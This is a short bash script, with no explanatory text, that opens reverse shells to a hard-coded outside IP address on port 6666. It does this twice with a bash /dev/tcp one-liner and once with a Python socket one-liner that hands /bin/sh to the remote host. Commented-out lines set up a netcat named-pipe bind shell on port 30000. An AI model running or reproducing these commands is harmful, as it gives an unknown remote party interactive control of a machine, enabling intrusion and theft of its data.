#!/bin/bash
echo "Start!"

#touch mypipe
#echo "Pipe done"

#echo "Starting netcat..."
#cat mypipe|bash 2>&1|nc -lvp 30000 > mypipe
#nc -l -p 6666

echo "Starting shell reverse"
bash -i >& /dev/tcp/186.110.50.44/6666 0>&1

python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('186.110.50.44',6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" 2>&1

bash -i >& /dev/tcp/186.110.50.44/6666 0>&1

echo "Done?"
